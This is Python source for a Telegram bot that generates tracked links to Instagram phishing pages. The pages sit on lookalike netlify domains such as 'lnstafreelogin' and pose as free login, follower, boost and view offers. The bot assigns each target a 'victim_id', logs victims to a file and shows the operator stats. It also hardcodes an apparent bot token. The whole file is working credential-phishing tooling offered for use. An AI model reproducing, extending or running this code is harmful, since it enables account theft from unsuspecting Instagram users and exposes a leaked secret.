#!/usr/bin/env python3
# language: python, file: main.py, runtime: python 3.10+, hosting: any

import os
import random
import string
import logging
from datetime import datetime
from pathlib import Path

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    ContextTypes, MessageHandler, filters
)

# ============================================================
# 🔥 CONFIG — SAB YAHI EDIT KAR
# ============================================================
BOT_TOKEN = "9106991758:AAEIkdjiEabfkZtf2aZKSRxyyCEcRfT3RHk"

PAGES = {
    "login":     "https://lnstafreelogin.netlify.app/",
    "boost":     "https://instafollowers64.netlify.app/",
    "followers": "https://instafollowerss1k.netlify.app/",
    "views":     "https://instafreereview.netlify.app/"
}

YOUTUBE_URL  = "https://www.instagram.com/_being.majnu_?srtk=dWZqdjFibGF6ZW4="
WHATSAPP_URL = "https://www.instagram.com/_being.majnu_?srtk=dWZqdjFibGF6ZW4="
DEVELOPER    = "MAJNU'S CREATION"

# ============================================================
# LOGGING
# ============================================================
logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(message)s",
    level=logging.INFO
)
log = logging.getLogger("insta-bot")

# ============================================================
# STORAGE
# ============================================================
VICTIMS_FILE = Path("victims.txt")
user_links = {}   # user_id -> {"victim_id": str, "page": str, "link": str}

def generate_victim_id():
    return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8))

def save_victim(user_id, victim_id, page_type, victim_link):
    try:
        with open(VICTIMS_FILE, "a") as f:
            f.write(f"{user_id}|{victim_id}|{page_type}|{victim_link}|{datetime.now().isoformat()}\n")
    except Exception as e:
        log.warning(f"save_victim fail: {e}")

def get_user_stats(user_id):
    try:
        if not VICTIMS_FILE.exists():
            return 0
        with open(VICTIMS_FILE, "r") as f:
            return sum(1 for line in f if line.startswith(f"{user_id}|"))
    except Exception:
        return 0

# ============================================================
# UI HELPERS
# ============================================================
def main_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📱 Instagram Login",  callback_data="gen_login")],
        [InlineKeyboardButton("🚀 Instagram Boost",  callback_data="gen_boost")],
        [InlineKeyboardButton("📈 Free Followers",   callback_data="gen_followers")],
        [InlineKeyboardButton("👁️ Profile Views",    callback_data="gen_views")],
        [InlineKeyboardButton("📊 My Stats",         callback_data="my_stats")],
        [InlineKeyboardButton("📺 YouTube",          url=YOUTUBE_URL)],
        [InlineKeyboardButton("💬 WhatsApp",         url=WHATSAPP_URL)]
    ])

PAGE_META = {
    "login":     ("📱", "Instagram Login"),
    "boost":     ("🚀", "Instagram Boost"),
    "followers": ("📈", "Free Followers"),
    "views":     ("👁️", "Profile Views"),
}

def build_victim_link(page_type, victim_id, user_id):
    base = PAGES.get(page_type, PAGES["login"])
    sep  = "&" if "?" in base else "?"
    return f"{base}{sep}id={victim_id}&user_id={user_id}"

# ============================================================
# COMMANDS
# ============================================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"📱 *INSTAGRAM LINK-GEN BOT*\n\n"
        f"👤 Hello *{update.effective_user.first_name}*!\n\n"
        f"📌 Choose a page type below:\n"
        f"1️⃣ Login Page\n"
        f"2️⃣ Boost Page\n"
        f"3️⃣ Free Followers\n"
        f"4️⃣ Profile Views\n\n"
        f"⚡ *Developed by {DEVELOPER}*",
        parse_mode="Markdown",
        reply_markup=main_keyboard()
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"📱 *Commands:*\n"
        f"/start — Main menu\n"
        f"/stats — Your stats\n"
        f"/help — This help\n\n"
        f"⚡ *{DEVELOPER}*",
        parse_mode="Markdown"
    )

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    data = user_links.get(user_id, {})
    total = get_user_stats(user_id)
    await update.message.reply_text(
        f"📊 *Your Stats*\n\n"
        f"🆔 Victim ID: `{data.get('victim_id', 'Not generated')}`\n"
        f"📱 Total Links: {total}\n\n"
        f"⚡ *{DEVELOPER}*",
        parse_mode="Markdown"
    )

# ============================================================
# CALLBACKS
# ============================================================
async def gen_page(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    page_type = q.data.replace("gen_", "")
    user_id = q.from_user.id
    vid = generate_victim_id()
    link = build_victim_link(page_type, vid, user_id)
    user_links[user_id] = {"victim_id": vid, "page": page_type, "link": link}
    save_victim(user_id, vid, page_type, link)

    emoji, name = PAGE_META.get(page_type, ("📱", "Instagram"))
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("📤 Share Link", url=f"https://t.me/share/url?url={link}")],
        [InlineKeyboardButton("🔄 New Link",  callback_data=f"gen_{page_type}")],
        [InlineKeyboardButton("📊 My Stats",  callback_data="my_stats")],
        [InlineKeyboardButton("📺 YouTube",   url=YOUTUBE_URL)],
        [InlineKeyboardButton("💬 WhatsApp",  url=WHATSAPP_URL)]
    ])
    stats = get_user_stats(user_id)
    await q.edit_message_text(
        f"{emoji} *{name} PAGE GENERATED!*\n\n"
        f"🆔 ID: `{vid}`\n\n"
        f"🔗 *Link:*\n`{link}`\n\n"
        f"📊 Total Links: *{stats}*\n\n"
        f"⚡ *{DEVELOPER}*",
        parse_mode="Markdown",
        reply_markup=kb
    )

async def my_stats_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    user_id = q.from_user.id
    data = user_links.get(user_id, {})
    total = get_user_stats(user_id)
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔄 Refresh",  callback_data="my_stats")],
        [InlineKeyboardButton("📱 New Page", callback_data="new_page")]
    ])
    await q.edit_message_text(
        f"📊 *Your Stats*\n\n"
        f"🆔 Victim ID: `{data.get('victim_id', 'Not generated')}`\n"
        f"📱 Total Links: {total}\n\n"
        f"⚡ *{DEVELOPER}*",
        parse_mode="Markdown",
        reply_markup=kb
    )

async def new_page_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    await q.edit_message_text(
        f"📱 *Choose a page type:*\n\n⚡ *{DEVELOPER}*",
        parse_mode="Markdown",
        reply_markup=main_keyboard()
    )

# ============================================================
# MAIN
# ============================================================
def main():
    if not BOT_TOKEN or ":" not in BOT_TOKEN:
        log.error("BOT_TOKEN invalid. Edit main.py.")
        raise SystemExit(1)

    log.info(f"Starting bot | dev={DEVELOPER}")
    log.info(f"Pages: {list(PAGES.keys())}")

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help",  help_command))
    app.add_handler(CommandHandler("stats", stats_command))

    app.add_handler(CallbackQueryHandler(gen_page,    pattern=r"^gen_(login|boost|followers|views)$"))
    app.add_handler(CallbackQueryHandler(my_stats_cb, pattern=r"^my_stats$"))
    app.add_handler(CallbackQueryHandler(new_page_cb, pattern=r"^new_page$"))

    log.info("Polling started.")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()